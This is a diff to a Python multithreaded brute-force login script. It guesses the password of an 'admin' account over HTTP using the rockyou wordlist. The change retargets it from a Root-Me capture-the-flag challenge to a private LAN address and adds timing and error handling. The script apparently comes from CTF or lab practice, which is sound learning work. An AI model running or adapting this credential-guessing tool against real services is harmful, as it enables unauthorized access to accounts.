@@ -1,5 +1,6 @@
 from requests import get
 from base64 import b64encode
+import sys
 import os
 import shutil
 import threading
@@ -7,18 +8,19 @@ import time
 
 class Environnement():
     def __init__(self, tries):
-        self.URL = 'http://challenge01.root-me.org/web-serveur/ch3/'
+        self.URL = 'http://192.168.43.32'
         self.USER = 'admin'
-        self.PATH = "list2.txt"  # Path of password list
+        self.PATH = "rockyou.txt"  # Path of password list
         self.TMP_PATH = "./tmp/"  # Created during the runtime -> store the files for each Thread
         self.FAILS, self.ERROR = 0, 0
         self.FLAG = ''
         self.TRIES = tries  # Password number to check : WARNING -> percentage not accurate if to big
         self.FOUND = False
-        self.THREAD_NUMBER = 4
+        self.THREAD_NUMBER = 4 # Warning too much thread can be more slower (the computer need to manage them so his capacities are used)
         self.FILES_PATHS = []  # Each thread has his file
         self.ATTEMPT = 0
         self.THREAD_PERCENTAGE = threading.Thread(target=self.thread_percentage_func())
+        self.INIT_TIME = time.time()
     def get_percentage(self):
         return self.ATTEMPT / self.TRIES
     def thread_percentage_func(self):
@@ -59,7 +61,9 @@ class BruteForceThread(threading.Thread):
                     except Exception as e:  # Catch problem
                         print('[ERROR] SOMETHING WENT WRONG')
                         env.ERROR += 1
-                        print(e)
+                        if env.ERROR > 10:
+                            print('[FATAL ERROR] Too much errors.')
+                            sys.exit(-1)
                 else:
                     f.close()   
             f.close()
@@ -70,10 +74,10 @@ def clean_tmp():
     os.mkdir("./tmp")
 
 def print_result():
-    print('\n\n   [+] END OF PROCESS\n')
+    print(f'\n\n   [+] END OF PROCESS ({int(time.time()-env.INIT_TIME)} s)\n')
     print('   [FAILS] %s' % (env.FAILS))
     if env.FOUND == True:
-        print("\n      > '%s' : '%s' (%s tries)" % (env.USER, env.FLAG, env.TRIES))
+        print("\n      > '%s' : '%s' (%s thread tries)" % (env.USER, env.FLAG, env.TRIES))
         print('\n')
 
 # Create for each thread -> his password list
@@ -102,6 +106,8 @@ if __name__ == '__main__':
     except:
         pass
     thread_file_splitting()
+
+    
 
     # the job list 
     jobs = []
